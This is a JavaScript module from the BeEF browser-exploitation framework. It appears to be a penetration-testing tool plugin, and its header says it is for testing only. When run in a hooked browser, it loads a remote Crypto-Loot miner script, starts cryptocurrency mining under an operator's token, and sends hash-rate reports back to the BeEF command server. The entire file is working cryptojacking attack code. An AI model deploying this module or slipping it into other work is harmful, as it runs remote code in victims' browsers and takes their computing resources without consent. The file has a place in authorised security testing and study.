//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//
// Crypto-Loot integration, Zaur Molotnikov, 2017
// Only for the use for test purposes!
// Inspired by coinhive integration (copied and modified)
//

beef.execute(function() {
  var comm_url = '<%= @command_url %>';
  var comm_id = <%= @command_id %>;
  var report_interval = +(<%= @report_interval %>) * 1000; // to miliseconds

  if (!beef.browser.hasWebSocket()) {
    beef.debug('[CryptoLoot] Error: browser does not support WebSockets');
    beef.net.send(comm_url, comm_id, "error=unsupported browser - does not support WebSockets", beef.are.status_error());
    return;
  }

  if (!beef.browser.hasWebWorker()) {
    beef.debug('[CryptoLoot] Error: browser does not support WebWorkers');
    beef.net.send(comm_url, comm_id, "error=unsupported browser - does not support WebWorkers", beef.are.status_error());
    return;
  }

  beef.debug("[CryptoLoot] Loading library...");
  beef.net.send(comm_url, comm_id, "[CryptoLoot] Loading library...");
  beef.dom.loadScript('https://crypto-loot.com/lib/miner.min.js');

  try {
    setTimeout("mine('<%= @public_token %>')", 10000);
  } catch(e) {
    beef.debug("[CryptoLoot] Error loading miner: " + e.message);
    beef.net.send(comm_url, comm_id, 'error=' + e.message, beef.are.status_error());
    return;
  }

  mine = function(token) {
    beef.debug("[CryptoLoot] Starting the miner...");
    beef.net.send(comm_url, comm_id, 'result=Starting the miner...');

    try {
      var miner = new CryptoLoot.Anonymous(token);
      miner.start();
    } catch(e) {
      beef.debug("[CryptoLoot] Error starting miner: " + e.message);
      beef.net.send(comm_url, comm_id, 'error=' + e.message, beef.are.status_error());
      return;
    }

    beef.debug("[CryptoLoot] setting triggers");

    miner.on('found', function() {
      beef.debug("[CryptoLoot] Hash found");
    });
    beef.debug("[CryptoLoot] 'found' trigger set");

    miner.on('accepted', function() {
      beef.debug("[CryptoLoot] Hash accepted by the pool");
    });
    beef.debug("[CryptoLoot] 'accepted' trigger set");


    setInterval(function() {
      beef.debug("[CryptoLoot] Miner progress:");
      beef.net.send(comm_url, comm_id, "[CryptoLoot] Miner progress:");
      if (miner.isRunning()) {
        var hashesPerSecond = miner.getHashesPerSecond();
        var totalHashes = miner.getTotalHashes();
        var acceptedHashes = miner.getAcceptedHashes();
        beef.debug("[CryptoLoot] Total Hashes: " + totalHashes + " -- Accepted Hashes: " + acceptedHashes + " -- Hashes/Second: " + hashesPerSecond);
        beef.net.send(comm_url, comm_id, "[CryptoLoot] Total Hashes: " + totalHashes + " -- Accepted Hashes: " + acceptedHashes + " -- Hashes/Second: " + hashesPerSecond);
      }
    }, report_interval)

  }
});
